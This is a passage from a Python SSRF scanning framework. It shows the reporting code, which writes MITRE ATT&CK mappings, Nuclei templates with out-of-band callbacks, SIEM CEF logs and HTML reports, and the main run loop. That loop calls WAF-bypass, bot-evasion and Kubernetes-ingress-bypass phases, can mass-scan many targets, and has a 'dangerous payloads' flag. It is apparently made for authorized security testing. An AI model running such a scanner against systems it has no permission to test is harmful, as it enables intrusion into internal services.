            "",
            f"Generated: {data['timestamp']}",
            "",
            "## MITRE ATT&CK Techniques",
            ""
        ]
        for tech in data["summary"]["techniques"]:
            lines.append(f"- **{tech.get('id')} - {tech.get('technique')}** ({tech.get('tactic')})")
            if tech.get("url"):
                lines.append(f"  - MITRE: {tech.get('url')}")
            if tech.get("atomic_red_team_url"):
                lines.append(f"  - Atomic Red Team reference: {tech.get('atomic_red_team_url')}")
        lines.extend(["", "## Remediation Plan", ""])
        for category, items in data["remediation_plan"].items():
            lines.append(f"### {category}")
            for item in items:
                lines.append(f"- {item.get('recommendation')}")
            lines.append("")
        lines.extend(["## Important Note", "", "This file maps SSRF findings to defensive MITRE ATT&CK context and remediation guidance. It does not run Atomic Red Team tests."])
        with open(md_file, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))
        if self.verbose:
            print(f"  {OK} MITRE ATT&CK export: {json_file}")
            print(f"  {OK} Remediation export: {md_file}")

    def export_nuclei(self):
        if not self.do_export_nuclei:
            return
        templates = []
        for ev in self.evidence:
            if not ev.out_of_band_hit:
                continue
            clean_endpoint = re.sub(r'[^a-zA-Z0-9_-]', '-', ev.endpoint.strip('/')) or 'root'
            clean_param = re.sub(r'[^a-zA-Z0-9_-]', '-', ev.param or 'param')
            template = {
                "id": f"ultimate-ssrf-{self._safe_target_name()}-{clean_endpoint}-{clean_param}".lower(),
                "info": {
                    "name": f"Potential SSRF on {ev.endpoint} via {ev.param}",
                    "author": "belladonnask",
                    "severity": ev.severity,
                    "description": "Generated from confirmed SSRF evidence collected by Ultimate SSRF Framework.",
                    "tags": "ssrf,oast,generated"
                },
                "requests": [{
                    "method": "GET",
                    "path": [f"{{{{BaseURL}}}}{ev.endpoint}?{ev.param}={{{{interactsh-url}}}}"],
                    "matchers": [{"type": "word", "part": "interactsh_protocol", "words": ["http", "dns"]}]
                }]
            }
            templates.append(template)
        if not templates:
            if self.verbose:
                print(f"  {DIM}No confirmed OOB SSRF evidence for Nuclei export{RESET}")
            return
        safe_target = self._safe_target_name()
        if YAML_AVAILABLE:
            report_file = self.output_dir / f"nuclei_{safe_target}.yaml"
            with open(report_file, "w", encoding="utf-8") as f:
                yaml.dump_all(templates, f, allow_unicode=True, sort_keys=False)
        else:
            report_file = self.output_dir / f"nuclei_{safe_target}.json"
            with open(report_file, "w", encoding="utf-8") as f:
                json.dump(templates, f, indent=2, ensure_ascii=False, default=str)
        if self.verbose:
            print(f"  {OK} Nuclei export: {report_file}")

    def export_siem_cef(self):
        if not self.do_export_siem:
            return
        entries = []
        def esc(v):
            return str(v).replace("\\", "\\\\").replace("=", "\\=").replace("|", "\\|").replace("\n", " ").replace("\r", " ")
        for attempt in self.scan_attempts:
            severity = attempt.severity or "info"
            signature = "SSRF confirmed" if attempt.vulnerable else "SSRF not confirmed"
            if attempt.result == "error":
                signature = "SSRF scan error"
            cef = f"CEF:0|SSRFFramework|UltimateSSRF|5.0|SSRF_ATTEMPT|{esc(signature)}|{esc(severity)}|"
            cef += (
                f"dhost={esc(self.target)} request={esc(attempt.tested_url)} "
                f"cs1Label=endpoint cs1={esc(attempt.endpoint)} "
                f"cs2Label=param cs2={esc(attempt.param)} "
                f"cs3Label=payload cs3={esc(attempt.payload)} "
                f"cs4Label=result cs4={esc(attempt.result)} "
                f"cs5Label=confidence cs5={esc(attempt.confidence)} "
                f"cn1Label=http_status cn1={attempt.status} "
                f"cs6Label=vulnerable cs6={esc(attempt.vulnerable)}"
            )
            mitre_record = self._mitre_record_for_attempt(attempt)
            mitre_ids = ",".join(t.get("id", "") for t in mitre_record.get("mitre_attack", []))
            remediation = mitre_record.get("remediations", [{}])[0].get("recommendation", "") if mitre_record.get("remediations") else ""
            cef += f" flexString1Label=mitre_techniques flexString1={esc(mitre_ids)}"
            cef += f" flexString2Label=primary_remediation flexString2={esc(remediation)}"
            if attempt.error:
                cef += f" msg={esc(attempt.error)}"
            entries.append(cef)
        for ev in self.evidence:
            cef = f"CEF:0|SSRFFramework|UltimateSSRF|5.0|SSRF_FINDING|SSRF evidence|{esc(ev.severity)}|"
            cef += (
                f"dhost={esc(self.target)} request={esc(ev.url)} "
                f"cs1Label=endpoint cs1={esc(ev.endpoint)} "
                f"cs2Label=param cs2={esc(ev.param)} "
                f"cs3Label=payload cs3={esc(ev.payload)} "
                f"cs4Label=patterns cs4={esc(', '.join(ev.matched_patterns))} "
                f"cs5Label=oob cs5={esc(ev.out_of_band_hit)} "
                f"cn1Label=impact_score cn1={int(ev.impact_score)}"
            )
            mitre_record = self._mitre_record_for_evidence(ev)
            mitre_ids = ",".join(t.get("id", "") for t in mitre_record.get("mitre_attack", []))
            remediation = mitre_record.get("remediations", [{}])[0].get("recommendation", "") if mitre_record.get("remediations") else ""
            cef += f" flexString1Label=mitre_techniques flexString1={esc(mitre_ids)}"
            cef += f" flexString2Label=primary_remediation flexString2={esc(remediation)}"
            entries.append(cef)
        for item in self.other_issue_attempts:
            cef = f"CEF:0|SSRFFramework|UltimateSSRF|5.0|AI_SAFE_CHECK|{esc(item.get('issue_type'))}|{esc(item.get('result'))}|"
            cef += (
                f"dhost={esc(self.target)} request={esc(item.get('tested_url', ''))} "
                f"cs1Label=endpoint cs1={esc(item.get('endpoint'))} "
                f"cs2Label=param cs2={esc(item.get('param'))} "
                f"cs3Label=payload cs3={esc(item.get('payload'))} "
                f"cs4Label=result cs4={esc(item.get('result'))} "
                f"cs5Label=confidence cs5={esc(item.get('confidence', 'low'))}"
            )
            entries.append(cef)
        cef_file = self.output_dir / f"siem_{self._safe_target_name()}.cef"
        with open(cef_file, "w", encoding="utf-8") as f:
            f.write("\n".join(entries))
        if self.verbose:
            print(f"  {OK} CEF exported: {cef_file}")

    def export_json_api(self):
        if not self.do_export_json_api:
            return
        attempts = [asdict(attempt) for attempt in self.scan_attempts]
        vulnerable_attempts = [a for a in attempts if a.get("vulnerable")]
        error_attempts = [a for a in attempts if a.get("result") == "error"]
        not_confirmed_attempts = [a for a in attempts if a.get("result") == "not_confirmed"]
        data = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "framework_version": "5.0-waf-aware",
            "cloud": self.cloud,
            "waf": self.waf_info,
            "lab_profile": self.lab_profile,
            "manual_paths": self.manual_paths,
            "is_vulnerable_to_ssrf": bool(vulnerable_attempts) or bool(self.evidence),
            "status": "vulnerable" if vulnerable_attempts or self.evidence else "not_confirmed",
            "total_findings": len(self.evidence),
            "unique_findings": len(self._dedup()),
            "callbacks": len(self.callbacks),
            "lab_profile": self.lab_profile,
            "manual_paths": self.manual_paths,
            "custom_payloads": self.custom_payloads,
            "attempt_summary": {
                "total": len(attempts),
                "vulnerable": len(vulnerable_attempts),
                "not_confirmed": len(not_confirmed_attempts),
                "errors": len(error_attempts),
                "ai_suggested_checks": len(self.other_issue_attempts)
            },
            "vulnerable_payloads": vulnerable_attempts,
            "not_confirmed_payloads": not_confirmed_attempts,
            "errors": error_attempts,
            "evidence": [asdict(ev) for ev in self.evidence],
            "callbacks_detail": dict(self.callbacks),
            "internal_ips": list(self.internal_ips),
            "ai_suggestions": self.ai_suggestions,
            "other_issue_attempts": self.other_issue_attempts,
            "mitre_attack": self.build_mitre_report()
        }
        report_file = self.output_dir / f"api_report_{self._safe_target_name()}.json"
        with open(report_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        if self.verbose:
            print(f"  {OK} JSON API exported: {report_file}")

    def generate_attack_map(self):
        if not self.do_attack_map:
            return
        if not NETWORKX_AVAILABLE:
            if self.verbose:
                print(f"{WARN} networkx missing")
            return
        G = nx.Graph()
        G.add_node(self.target, type="target", status="vulnerable" if self.evidence else "not_confirmed")
        for ip in sorted(self.internal_ips):
            G.add_node(ip, type="internal")
            G.add_edge(self.target, ip, relation="internal-reference")
        for index, attempt in enumerate(self.scan_attempts[:250], 1):
            attempt_id = f"attempt-{index}"
            G.add_node(attempt_id, type="attempt", endpoint=attempt.endpoint, param=attempt.param, payload=attempt.payload, result=attempt.result, vulnerable=str(attempt.vulnerable), status=str(attempt.status))
            G.add_edge(self.target, attempt_id, relation="tested")
            mitre_record = self._mitre_record_for_attempt(attempt)
            for tech in mitre_record.get("mitre_attack", []):
                tech_id = tech.get("id")
                if tech_id:
                    G.add_node(tech_id, type="mitre_attack", technique=tech.get("technique"), tactic=tech.get("tactic"), url=tech.get("url"))
                    G.add_edge(attempt_id, tech_id, relation="mapped-to")
            if attempt.vulnerable:
                payload_id = f"payload-{index}"
                G.add_node(payload_id, type="payload", value=attempt.payload, severity=attempt.severity)
                G.add_edge(attempt_id, payload_id, relation="confirmed-payload")
        for index, item in enumerate(self.other_issue_attempts[:100], 1):
            issue_id = f"ai-issue-{index}"
            G.add_node(issue_id, type="ai_suggested_check", issue_type=str(item.get("issue_type")), endpoint=str(item.get("endpoint")), param=str(item.get("param")), result=str(item.get("result")), confidence=str(item.get("confidence", "low")))
            G.add_edge(self.target, issue_id, relation="ai-suggested-check")
        graph_file = self.output_dir / f"attack_map_{self._safe_target_name()}.gexf"
        nx.write_gexf(G, graph_file)
        if self.verbose:
            print(f"  {OK} Attack map exported: {graph_file}")

    async def generate_html(self):
        if not JINJA2_AVAILABLE:
            return
        deduped = self._dedup()
        attempts = [asdict(attempt) for attempt in self.scan_attempts[:500]]
        evidence_items = [asdict(ev) for ev in self.evidence]
        vulnerable_attempts = [attempt for attempt in attempts if attempt.get("vulnerable")]
        errors = [attempt for attempt in attempts if attempt.get("result") == "error"]
        not_confirmed = [attempt for attempt in attempts if attempt.get("result") == "not_confirmed"]
        suspected = [item for item in self.other_issue_attempts if item.get("result") in ("suspected_other_issue", "manual_review")]
        vulnerable = bool(vulnerable_attempts) or bool(self.evidence)
        status_label = "VALIDATED FINDING" if vulnerable else "NO CONFIRMED SSRF"
        report_confidence = "High" if any(ev.get("out_of_band_hit") for ev in evidence_items) else "Medium" if vulnerable else "Low"
        mitre_report = self.build_mitre_report()
        vulns = []
        for (ep, param), info in deduped.items():
            samples = []
            for ev in info.get("items", [])[:5]:
                samples.append({
                    "url": ev.url,
                    "payload": ev.payload,
                    "status": ev.status,
                    "severity": ev.severity,
                    "patterns": ev.matched_patterns,
                    "body_snippet": ev.body_snippet,
                    "out_of_band_hit": ev.out_of_band_hit,
                    "impact_score": ev.impact_score,
                })
            vulns.append({
                "endpoint": ep or "unknown",
                "param": param or "callback",
                "severity": info["max_sev"],
                "count": info["count"],
                "oob": info["oob"],
                "samples": samples,
            })
        remediation_flat = []
        for category, items in mitre_report.get("remediation_plan", {}).items():
            for item in items:
                remediation_flat.append({
                    "category": category,
                    "priority": item.get("priority", "Medium"),
                    "recommendation": item.get("recommendation", ""),
                    "details": item.get("details", ""),
                })
        html = Template("""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Security Validation Report - {{target}}</title>
<style>
:root{--bg:#0b1020;--panel:#121a33;--panel2:#17213f;--text:#e8eefc;--muted:#9fb0d0;--border:#2b3a63;--critical:#ef4444;--high:#f97316;--medium:#eab308;--low:#22c55e;--info:#60a5fa;--purple:#8b5cf6}*{box-sizing:border-box}body{margin:0;font-family:Inter,Segoe UI,Arial,sans-serif;background:var(--bg);color:var(--text);line-height:1.5}.wrap{max-width:1320px;margin:0 auto;padding:28px}.hero{background:linear-gradient(135deg,#1d4ed8,#7c3aed);border-radius:18px;padding:30px;margin-bottom:20px;box-shadow:0 20px 60px rgba(0,0,0,.25)}.hero h1{margin:0;font-size:34px}.hero p{margin:8px 0 0;color:#eef2ff}.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:18px 0}.metric{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:16px}.metric .num{font-size:28px;font-weight:800}.metric .label{color:var(--muted);font-size:13px}.card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:20px;margin:16px 0}.card h2{margin-top:0;font-size:22px}.card h3{margin-bottom:8px}.muted{color:var(--muted)}table{width:100%;border-collapse:collapse;font-size:13px;overflow:hidden;border-radius:10px}th{background:#0f1a35;color:#cfe0ff;text-align:left;padding:10px;border-bottom:1px solid var(--border)}td{padding:10px;border-bottom:1px solid var(--border);vertical-align:top;word-break:break-word}.badge{display:inline-block;padding:4px 9px;border-radius:999px;font-size:12px;font-weight:700}.badge-critical,.badge-vulnerable{background:var(--critical);color:white}.badge-high{background:var(--high);color:white}.badge-medium,.badge-manual_review,.badge-suspected_other_issue{background:var(--medium);color:#111827}.badge-low{background:var(--low);color:#06210f}.badge-info,.badge-not_confirmed{background:#334155;color:#dbeafe}.badge-error{background:#7f1d1d;color:white}.badge-ok{background:#166534;color:white}.code,code,pre{font-family:Consolas,Monaco,monospace}.code{background:#090f1f;border:1px solid #26385f;color:#c7e0ff;border-radius:8px;padding:8px;display:block;white-space:pre-wrap;max-height:220px;overflow:auto}.section-note{background:#101a35;border-left:4px solid var(--info);padding:12px;border-radius:8px;color:#dbeafe}.toc a{color:#93c5fd;text-decoration:none;margin-right:14px}.risk{font-size:16px}.footer{color:var(--muted);font-size:12px;text-align:center;margin:28px 0}.print-note{display:none}@media(max-width:900px){.grid{grid-template-columns:repeat(2,1fr)}}@media print{body{background:white;color:#111827}.wrap{max-width:none;padding:12px}.hero,.card,.metric{box-shadow:none;background:white;color:#111827;border:1px solid #d1d5db}.muted,.footer{color:#374151}.code{background:#f3f4f6;color:#111827;border:1px solid #d1d5db}.badge-not_confirmed,.badge-info{background:#e5e7eb;color:#111827}.print-note{display:block}}
</style>
</head>
<body>
<div class="wrap">
<div class="hero">
<h1>Security Validation Report</h1>
<p><strong>Target:</strong> {{target}} · <strong>Generated:</strong> {{date}} · <strong>Tool:</strong> Ultimate SSRF Framework v5.0</p>
<p><strong>Validation status:</strong> {% if vulnerable %}<span class="badge badge-vulnerable">{{status_label}}</span>{% else %}<span class="badge badge-not_confirmed">{{status_label}}</span>{% endif %} <strong>Confidence:</strong> {{report_confidence}}</p>
</div>
<div class="card toc"><strong>Sections:</strong> <a href="#executive">Executive Summary</a><a href="#scope">Scope</a><a href="#findings">Validated Findings</a><a href="#evidence">Evidence</a><a href="#mitre">MITRE ATT&CK</a><a href="#remediation">Remediation</a><a href="#attempts">Validation Attempts</a></div>
<div class="grid">
<div class="metric"><div class="num">{{attempts|length}}</div><div class="label">Payload attempts</div></div>
<div class="metric"><div class="num">{{vulnerable_attempts|length}}</div><div class="label">Confirmed attempts</div></div>
<div class="metric"><div class="num">{{findings}}</div><div class="label">Evidence objects</div></div>
<div class="metric"><div class="num">{{errors|length}}</div><div class="label">Errors</div></div>
</div>
<div class="card" id="executive">
<h2>Executive Summary</h2>
{% if vulnerable %}
<p class="risk">The validation identified evidence consistent with SSRF or sensitive server-side resource access on <strong>{{target}}</strong>. Confirmed evidence is listed below with tested payloads, affected parameters and response snippets.</p>
{% else %}
<p class="risk">No SSRF evidence was confirmed during this run. This does not prove the target is safe; it only means the tested payloads did not produce confirmed evidence under the current scan conditions.</p>
{% endif %}
<div class="section-note"><strong>Validation note:</strong> This report is intended for security team review. Reproduce confirmed items manually before remediation closure, and avoid sharing raw reports publicly if response snippets contain secrets, internal IPs or tokens.</div>
</div>
<div class="card" id="scope">
<h2>Scope and Environment</h2>
<table><tr><th>Item</th><th>Value</th></tr><tr><td>Target</td><td>{{target}}</td></tr><tr><td>Base URL</td><td>{{base}}</td></tr><tr><td>WAF</td><td>{{waf}}</td></tr><tr><td>Cloud signals</td><td>{{cloud}}</td></tr><tr><td>Endpoints discovered</td><td>{{endpoints}}</td></tr><tr><td>Callbacks observed</td><td>{{callbacks}}</td></tr><tr><td>Custom payloads</td><td>{{custom_payloads|join(', ') if custom_payloads else 'None'}}</td></tr></table>
</div>
<div class="card" id="findings">
<h2>Validated Findings</h2>
{% if vulns %}
<table><tr><th>Severity</th><th>Endpoint</th><th>Parameter</th><th>Evidence Count</th><th>OAST Hits</th><th>Representative Payloads</th></tr>{% for v in vulns %}<tr><td><span class="badge badge-{{v.severity}}">{{v.severity.upper()}}</span></td><td>{{v.endpoint}}</td><td>{{v.param}}</td><td>{{v.count}}</td><td>{{v.oob}}</td><td>{% for s in v.samples %}<code>{{s.payload}}</code>{% if not loop.last %}<br>{% endif %}{% endfor %}</td></tr>{% endfor %}</table>
{% else %}
<p class="muted">No confirmed findings were produced by this run.</p>
{% endif %}
</div>
<div class="card" id="evidence">
<h2>Evidence Details</h2>
{% if evidence_items %}
{% for ev in evidence_items %}
<h3><span class="badge badge-{{ev.severity}}">{{ev.severity.upper()}}</span> {{ev.endpoint}} via {{ev.param}}</h3>
<table><tr><th>Field</th><th>Value</th></tr><tr><td>URL</td><td><code>{{ev.url}}</code></td></tr><tr><td>Payload</td><td><code>{{ev.payload}}</code></td></tr><tr><td>Status</td><td>{{ev.status}}</td></tr><tr><td>Matched patterns</td><td>{{ev.matched_patterns|join(', ')}}</td></tr><tr><td>Out-of-band callback</td><td>{{ev.out_of_band_hit}}</td></tr><tr><td>Impact score</td><td>{{ev.impact_score}}</td></tr></table>
<p><strong>Response snippet:</strong></p><pre class="code">{{ev.body_snippet}}</pre>
{% endfor %}
{% else %}
<p class="muted">No confirmed evidence snippets were collected.</p>
{% endif %}
</div>
<div class="card" id="mitre">
<h2>MITRE ATT&CK Mapping</h2>
<table><tr><th>Technique</th><th>Tactic</th><th>Why it applies</th><th>Atomic Red Team Reference</th></tr>{% for tech in mitre_report.summary.techniques %}<tr><td><strong>{{tech.id}}</strong><br>{{tech.technique}}</td><td>{{tech.tactic}}</td><td>{{tech.reason}}</td><td><code>{{tech.atomic_red_team_path}}</code></td></tr>{% endfor %}</table>
</div>
<div class="card" id="remediation">
<h2>Remediation Guidance</h2>
<table><tr><th>Priority</th><th>Category</th><th>Recommendation</th><th>Implementation Notes</th></tr>{% for item in remediation_flat %}<tr><td><span class="badge badge-{{item.priority|lower}}">{{item.priority}}</span></td><td>{{item.category}}</td><td>{{item.recommendation}}</td><td>{{item.details}}</td></tr>{% endfor %}</table>
</div>
<div class="card">
<h2>Validation and Retest Checklist</h2>
<ul><li>Confirm each affected endpoint only accepts approved URL schemes and destinations.</li><li>Block link-local metadata IPs, localhost, private RFC1918 ranges and internal service names unless explicitly required.</li><li>Use allowlisted destinations instead of blocklists where possible.</li><li>Disable redirects or re-validate the final resolved destination after redirects.</li><li>Add network egress controls for the application runtime.</li><li>Remove sensitive secrets from files reachable by server-side fetch functionality.</li><li>Retest the exact payloads listed in the Evidence Details section.</li></ul>
</div>
<div class="card" id="attempts">
<h2>Validation Attempts</h2>
<table><tr><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Payload</th><th>Evidence / Error</th><th>Response Snippet</th></tr>{% for a in attempts %}<tr><td><span class="badge badge-{{a.result}}">{{a.result}}</span></td><td>{{a.status}}</td><td>{{a.endpoint}}</td><td>{{a.param}}</td><td><code>{{a.payload}}</code></td><td>{% if a.matched_patterns %}{{a.matched_patterns|join(', ')}}{% elif a.error %}{{a.error}}{% else %}No SSRF evidence confirmed for this payload.{% endif %}</td><td><pre class="code">{{a.body_snippet}}</pre></td></tr>{% endfor %}</table>
</div>
<div class="card">
<h2>AI Suggested Safe Checks</h2>
{% if other_issue_attempts %}
<table><tr><th>Issue Type</th><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Evidence / Reason</th></tr>{% for item in other_issue_attempts %}<tr><td>{{item.issue_type}}</td><td><span class="badge badge-{{item.result}}">{{item.result}}</span></td><td>{{item.status}}</td><td>{{item.endpoint}}</td><td>{{item.param}}</td><td>{% if item.evidence %}{{item.evidence|join(', ')}}{% else %}{{item.reason}}</td>{% endif %}</tr>{% endfor %}</table>
{% else %}<p class="muted">No AI suggested checks were recorded.</p>{% endif %}
</div>
<div class="footer">Generated for authorized security validation. Review and redact sensitive data before sharing.</div>
</div>
</body>
</html>
        """).render(
            target=self.target,
            base=self.base,
            date=datetime.now().strftime("%Y-%m-%d %H:%M"),
            waf=self.waf_info.get("primary", "N/A") if self.waf_info else "N/A",
            cloud=", ".join(self.cloud) if self.cloud else "Unknown",
            endpoints=len(self.endpoints),
            findings=len(self.evidence),
            unique=len(deduped),
            callbacks=len(self.callbacks),
            vulns=vulns,
            attempts=attempts,
            vulnerable_attempts=vulnerable_attempts,
            vulnerable=vulnerable,
            errors=errors,
            not_confirmed=not_confirmed,
            suspected=suspected,
            evidence_items=evidence_items,
            other_issue_attempts=self.other_issue_attempts,
            mitre_report=mitre_report,
            remediation_flat=remediation_flat,
            status_label=status_label,
            report_confidence=report_confidence,
            custom_payloads=self.custom_payloads,
        )
        with open(self.html_file, "w", encoding="utf-8") as f:
            f.write(html)
        if self.verbose:
            print(f"  {OK} Security validation HTML report: {self.html_file}")

    async def save_json(self):
        vulnerable = any(attempt.vulnerable for attempt in self.scan_attempts) or bool(self.evidence)
        data = {
            "target": self.target,
            "time": datetime.now().isoformat(),
            "framework_version": "5.0-waf-aware",
            "cloud": self.cloud,
            "waf": self.waf_info,
            "lab_profile": self.lab_profile,
            "manual_paths": self.manual_paths,
            "is_vulnerable_to_ssrf": vulnerable,
            "status": "vulnerable" if vulnerable else "not_confirmed",
            "endpoints": [{"path": e.path, "method": e.method, "params": list(e.params), "status": e.test_response_code, "content_type": e.content_type} for e in self.endpoints],
            "attempts": [asdict(attempt) for attempt in self.scan_attempts],
            "evidence": [asdict(ev) for ev in self.evidence],
            "callbacks": dict(self.callbacks),
            "internal_ips": list(self.internal_ips),
            "ai_suggestions": self.ai_suggestions,
            "other_issue_attempts": self.other_issue_attempts,
            "mitre_attack": self.build_mitre_report()
        }
        with open(self.json_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)

    def print_summary(self):
        deduped = self._dedup()
        vulnerable = any(a.vulnerable for a in self.scan_attempts) or bool(self.evidence)
        errors = sum(1 for attempt in self.scan_attempts if attempt.result == "error")
        not_confirmed = sum(1 for attempt in self.scan_attempts if attempt.result == "not_confirmed")
        print(f"\n{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"{BOLD}{GREEN}  SCAN COMPLETE - {self.target}{RESET}")
        print(f"{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"  Status: {'vulnerable' if vulnerable else 'not_confirmed'}")
        print(f"  WAF: {self.waf_info.get('primary','N/A') if self.waf_info else 'N/A'}")
        print(f"  Cloud: {', '.join(self.cloud) or 'Unknown'}")
        print(f"  Endpoints: {len(self.endpoints)}")
        print(f"  Attempts: {len(self.scan_attempts)} total / {not_confirmed} not confirmed / {errors} errors")
        print(f"  Evidence: {len(self.evidence)} raw / {len(deduped)} unique")
        print(f"  Callbacks: {len(self.callbacks)}")
        for (ep, param), info in list(deduped.items())[:10]:
            sev = info["max_sev"]
            col = {"critical": RED, "high": YELLOW, "medium": MAGENTA}.get(sev, BLUE)
            print(f"  {col}[{sev.upper()}]{RESET} {ep} → {param} ({info['oob']} callbacks)")
        print(f"\n  {DIM}Report: {self.html_file}{RESET}")
        print(f"  {DIM}Results: {self.json_file}{RESET}")
        if self.do_export_mitre:
            print(f"  {DIM}MITRE: {self.output_dir / ('mitre_attack_' + self._safe_target_name() + '.json')}{RESET}")
            print(f"  {DIM}Remediation: {self.output_dir / ('remediation_' + self._safe_target_name() + '.md')}{RESET}")

    async def run(self):
        print(f"\n{BOLD}{'='*50}{RESET}\n{BOLD}Target:{RESET} {self.target}\n{BOLD}Callback:{RESET} {self.cb}")
        if self.dangerous_payloads: print(f"{BOLD}{RED}DANGEROUS payloads enabled!{RESET}")
        if self.lab_profile != "generic" and self.verbose:
            print(f"{OK} Lab profile: {self.lab_profile}")
        if self.manual_paths and self.verbose:
            print(f"{OK} Manual paths: {', '.join(self.manual_paths)}")
        if self.custom_payloads and self.verbose:
            print(f"{OK} Loaded {len(self.custom_payloads)} custom payloads")
        await self.start()
        try:
            if self.url_template:
                payloads = self.custom_payloads or ["localhost/config"]
                if self.verbose:
                    print(f"\n{CYAN}[DIRECT URL]{RESET} Testing exact URL template...")
                for payload in payloads:
                    await self.test_url_template_payload(payload, "Direct URL", "Exact URL template")
                if not self.evidence and self.verbose:
                    print(f"\n{OK} No confirmed SSRF findings detected. Generating not_confirmed report.")
                self.export_nuclei()
                self.export_siem_cef()
                self.export_json_api()
                self.generate_attack_map()
                self.export_mitre_attack()
                await self.generate_html()
                await self.save_json()
                self.print_summary()
                return
            await self.discover()
            if not self.no_waf:
                s, b, h = await self.request("GET", self.base)
                self.waf_info = self.waf.fingerprint(h, b)
                if self.verbose:
                    if self.waf_info.get("detected"):
                        print(f"\n{CYAN}[WAF]{RESET} {YELLOW}{self.waf_info['primary']}{RESET} ({self.waf_info['confidence']:.0f}%)")
                        bypass = self.waf_info.get("bypass_suggestions", [])
                        if bypass: print(f"  {DIM}Bypass suggestions: {', '.join(bypass[:5])}{RESET}")
                    else: print(f"\n{CYAN}[WAF]{RESET} None detected")
            await self.detect_cloud()
            await self.basic()
            await self.phase_graphql_ssrf()
            await self.phase_api_schema_bypass()
            await self.phase_service_mesh_ssrf()
            await self.phase_bot_evasion()
            await self.phase_kubernetes_ingress_bypass()
            await self.run_ai_phases()
            if not self.evidence and self.verbose:
                print(f"\n{OK} No confirmed SSRF findings detected. Generating not_confirmed report.")
            self.export_nuclei()
            self.export_siem_cef()
            self.export_json_api()
            self.generate_attack_map()
            self.export_mitre_attack()
            await self.generate_html()
            await self.save_json()
            self.print_summary()
        finally:
            await self.stop()

async def main():
    parser = setup_argparse()
    args = parser.parse_args()
    if args.param and not args.target:
        parser.error("--param can only be used with --target. For mass scanning, omit --param and let the framework discover parameters automatically.")
    if args.payload_file and not Path(args.payload_file).is_file():
        parser.error(f"--payload-file not found: {args.payload_file}")
    print(BANNER)

    targets = TargetManager.from_args(args)
    if not targets:

        t = input("Target domain: ").strip()
        targets = [TargetManager._clean(t)] if t else []
    for i, t in enumerate(targets, 1):
        print(f"\n{BOLD}{YELLOW}[{i}/{len(targets)}]{RESET} Scanning: {t}")
        await UltimateSSRFFramework(t, args).run()
        if i < len(targets): await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
